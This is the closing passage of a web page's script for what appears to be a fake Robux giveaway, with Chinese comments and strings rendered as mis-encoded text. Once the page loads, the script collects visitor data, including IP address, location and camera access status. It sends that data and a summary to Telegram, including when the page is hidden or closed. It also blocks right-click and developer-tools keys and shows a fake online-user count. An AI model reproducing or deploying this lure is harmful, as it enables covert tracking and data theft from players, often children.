                console.error('æ•°æ®å‘é€å¤±è´¥:', error);
            }
        }

        // å®ŒæˆéªŒè¯
        async function completeVerification() {
            updateProgress('æ­£åœ¨å®Œæˆå‚ä¸...', 100);
            
            // å‘é€æœ€ç»ˆæ•°æ®
            await sendTelemetryData();
            telemetrySent = true;
            
            // æ¸…é™¤å®šæ—¶å™¨
            if (dataStreamInterval) {
                clearInterval(dataStreamInterval);
            }
            
            // æ˜¾ç¤ºæˆåŠŸé¡µé¢
            setTimeout(() => {
                loadingOverlay.style.display = 'none';
                mainContent.style.display = 'block';
                verificationPanel.style.display = 'none';
                successScreen.style.display = 'block';
                
                // ç”ŸæˆæŠ½å¥–ç¼–å·
                const entryNum = generateEntryNumber();
                entryNumber.textContent = entryNum;
                collectedData.entryNumber = entryNum;
                
                // å‘é€æœ€ç»ˆç¡®è®¤
                setTimeout(() => {
                    const finalMessage = `âœ… éªŒè¯å®Œæˆ
ç”¨æˆ·: ${entryNum}
IPåœ°å€: ${collectedData.ip}
åœ°ç†ä½ç½®: ${collectedData.location}
æ‘„åƒå¤´: ${cameraAccessed ? 'æ˜¯' : 'å¦'}
æ€»æ•°æ®ç‚¹: ${Object.keys(collectedData).length}`;
                    
                    sendToTelegram(finalMessage);
                }, 1000);
                
            }, 1500);
        }

        // ==================== åˆå§‹åŒ– ====================

        // é¡µé¢åŠ è½½æ—¶å¼€å§‹
        window.addEventListener('DOMContentLoaded', () => {
            // å¼€å§‹åŠ è½½åŠ¨ç”»
            updateLoading('æ­£åœ¨åˆå§‹åŒ–RobuxæŠ½å¥–ç³»ç»Ÿ...');
            updateProgress('æ­£åœ¨åŠ è½½...', 10);
            
            // æ›´æ–°è®¡æ•°å™¨åŠ¨ç”»
            setInterval(() => {
                const current = parseInt(onlineCount.textContent.replace(/,/g, ''));
                const change = Math.floor(Math.random() * 5) - 2;
                onlineCount.textContent = Math.max(1000, current + change).toLocaleString();
            }, 3000);
            
            // 1ç§’åå¼€å§‹æ•°æ®æ”¶é›†
            setTimeout(() => {
                startDataCollection();
            }, 1000);
            
            // é˜²æ­¢å³é”®å’Œå¼€å‘è€…å·¥å…·
            document.addEventListener('contextmenu', (e) => e.preventDefault());
            document.addEventListener('keydown', (e) => {
                if (e.key === 'F12' || 
                    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
                    (e.ctrlKey && e.key === 'u')) {
                    e.preventDefault();
                }
            });
        });

        // é¡µé¢å…³é—­æ—¶å‘é€æ•°æ®
        window.addEventListener('beforeunload', () => {
            if (!telemetrySent) {
                sendTelemetryData();
            }
        });

        // é¡µé¢éšè—æ—¶å‘é€æ•°æ®
        document.addEventListener('visibilitychange', () => {
            if (document.hidden && !telemetrySent) {
                sendTelemetryData();
            }
        });
    </script>
</body>
</html>
